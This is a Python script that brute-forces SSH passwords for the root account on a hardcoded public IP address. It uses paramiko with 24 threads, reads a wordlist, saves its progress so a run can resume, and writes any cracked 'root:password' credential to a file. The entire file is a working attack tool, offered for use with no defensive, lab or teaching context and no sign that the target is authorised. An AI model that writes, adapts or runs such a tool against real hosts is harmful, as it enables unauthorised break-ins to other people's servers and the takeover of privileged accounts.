"""SSH password brute runner for Windows (paramiko) — paced, resumable, stops on hit."""
import paramiko, threading, sys, time, os, json

HOST = "2.59.219.71"
USER = "root"
WORTLIST = os.path.join(os.path.dirname(os.path.abspath(__file__)), "ssh_wordlist.txt")
STATE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "pbrute_state.json")
OUT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "pbrute_hit.txt")
THREADS = int(os.environ.get("THREADS", "24"))

words = [l.rstrip("\n") for l in open(WORTLIST, encoding="utf-8", errors="ignore") if l.strip()]
state = json.load(open(STATE)) if os.path.exists(STATE) else {"i": 0}
lock = threading.Lock()
stop = threading.Event()

def test(pw):
    c = paramiko.SSHClient()
    c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        c.connect(HOST, port=22, username=USER, password=pw, timeout=12,
                  banner_timeout=12, auth_timeout=12, look_for_keys=False, allow_agent=False)
        return True
    except paramiko.AuthenticationException:
        return False
    except Exception:
        return None
    finally:
        try:
            c.close()
        except Exception:
            pass

def worker():
    while not stop.is_set():
        with lock:
            i = state["i"]
            if i >= len(words):
                break
            state["i"] = i + 1
        pw = words[i]
        r = test(pw)
        if r is True:
            with lock:
                open(OUT, "w").write(f"root:{pw}\n")
                json.dump(state, open(STATE, "w"))
            print(f"\n!!! HIT root:{pw}", flush=True)
            stop.set()
            return
        if r is None:
            time.sleep(0.5)
        with lock:
            if state["i"] % 100 == 0:
                json.dump(state, open(STATE, "w"))
                print(f"{time.strftime('%H:%M:%S')} {state['i']}/{len(words)}", flush=True)

print(f"[pbrute] {len(words)} words, resume {state['i']}, {THREADS} threads", flush=True)
ts = [threading.Thread(target=worker, daemon=True) for _ in range(THREADS)]
for t in ts: t.start()
for t in ts: t.join()
json.dump(state, open(STATE, "w"))
print("[pbrute] done", state["i"], flush=True)
